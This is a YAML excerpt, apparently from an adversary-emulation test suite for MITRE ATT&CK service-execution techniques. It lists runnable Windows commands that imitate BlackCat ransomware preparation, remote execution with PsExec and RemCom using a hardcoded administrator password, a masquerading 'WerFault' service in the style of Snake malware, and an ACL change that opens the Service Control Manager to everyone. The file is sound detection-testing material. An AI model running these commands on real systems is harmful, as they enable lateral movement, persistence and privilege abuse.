    - name: BlackCat pre-encryption cmds with Lateral Movement
      type: powershell
      platform: windows
      command: "cmd.exe /c \"wmic \tcsproduct \tget UUID\" \ncmd.exe /c \"fsutil behavior \tset SymlinkEvaluation R2L:1\" \ncmd.exe /c \"fsutil behavior set \tSymlinkEvaluation R2R:1\"\nreg    add    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      \ncopy \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" $env:temp\ncmd.exe /c \"$env:temp\\psexec.exe  -accepteula  \\\\$ENV:COMPUTERNAME cmd.exe  /c echo \"--access-token\"\""
      cleanup: "reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v MaxMpxCt /f\ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2L:0\" \ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2R:0\"\nrm $env:temp\\psexec.exe"
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Use RemCom to execute a command on a remote host
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\remcom.exe" \\localhost /user:Administrator /pwd:P@ssw0rd1 cmd.exe'
      timeout: 120
      is_safe: true
    - name: Snake Malware Service Create
      type: cmd
      platform: windows
      command: sc.exe create "WerFaultSvc" binPath= "$env:windir\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\WerFault.exe" DisplayName= "WerFault Service" start= auto
      cleanup: sc.exe delete "WerFaultSvc"
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Modifying ACL of Service Control Manager via SDET
      type: cmd
      platform: windows
      command: sc.exe sdset scmanager D:(A;;KA;;;WD)
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Pipe Creation - PsExec Tool Execution From Suspicious Locations
      type: powershell
      platform: windows
      command: "cd C:\\Users\\Public\\Temp\\ \n.\\PsExec.exe -i -s cmd  -accepteula"
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1569/002
  is_safe: true
